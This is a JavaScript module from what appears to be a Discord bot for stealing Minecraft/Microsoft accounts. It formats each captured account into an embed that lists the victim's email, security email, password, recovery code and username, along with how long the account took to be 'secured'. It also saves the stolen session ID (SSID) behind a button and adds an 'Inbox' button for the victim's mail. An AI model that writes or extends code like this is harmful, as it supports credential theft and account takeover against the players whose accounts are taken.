// listAccount.js
const { EmbedBuilder } = require("@discordjs/builders");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { footer } = require("../../config.json");
const { queryParams } = require("../../db/db");
const generate = require("./generate");
const secureTime = require("./secureTime");
const getCapes = require("./secure/getCapes");

module.exports = async (acc) => {
    let msg = {};
    let i = generate(32);
    try {
        await queryParams(`INSERT INTO actions(id, action) VALUES(?, ?)`, [i, `ssid|${acc.ssid}`]);
    } catch (error) {
        console.error(`[ERROR] Failed to insert action into database: ${error.message}`);
    }

    let embed = new EmbedBuilder()
    .setColor(0x454FBF)
    .addFields([
        {
            name: "Email",
            value: `\`\`\`${acc.email || "No xbox profile!"}\`\`\``,
            inline: true
        },
        {
            name: "Security Email",
            value: `\`\`\`${acc.secEmail || "No xbox profile!"}\`\`\``,
            inline: true
        },
        {
            name: "Password",
            value: `\`\`\`${acc.password || "No xbox profile!"}\`\`\``,
            inline: true
        },
        {
            name: "Recovery Code",
            value: `\`\`\`${acc.recoveryCode || "No xbox profile!"}\`\`\``,
            inline: false
        },
        {
            name: "Username",
            value: `\`\`\`${acc.oldName || "No xbox profile!"}\`\`\``,
            inline: false
        },       
        {
            name: "Capes",
            value: "```" + (Array.isArray(acc.capes) && acc.capes.length > 0 ? acc.capes.join(", ") : "None") + "```",
            inline: true
        },
        {
            name: "Source",
            value: `\`\`\`${acc.method || "No xbox profile!"}\`\`\``,
            inline: true
        }
    ])
    .setTitle(`Account | ${acc.oldName || "No xbox profile!"}`)
    .setDescription(
        `[login](https://account.microsoft.com) | [Plancke](https://plancke.io/hypixel/player/stats/${encodeURIComponent(acc.oldName || "Unknown")}) | [SkyCrypt](https://sky.shiiyu.moe/stats/${encodeURIComponent(acc.oldName || "Unknown")}) | [Is Online?](https://hypixel.paniek.de/player/${encodeURIComponent(acc.oldName || "Unknown")}/status)`
    )
    .setThumbnail(`https://minotar.net/helm/${encodeURIComponent(acc.oldName || "Unknown")}/100.png`)
    .setFooter({ text: `Secured in ${acc.timeTaken || "Unknown"} seconds` })
    .setTimestamp(Date.now());
    msg.embeds = [embed];
    msg.components = [new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setCustomId("action|" + i)
            .setLabel("SSID")
            .setStyle(ButtonStyle.Danger),
        new ButtonBuilder()
            .setCustomId("email|" + (acc.secEmail || "No xbox profile!"))
            .setLabel("Inbox")
            .setEmoji("✉️")
            .setStyle(ButtonStyle.Secondary)
    )];
    return msg;
};
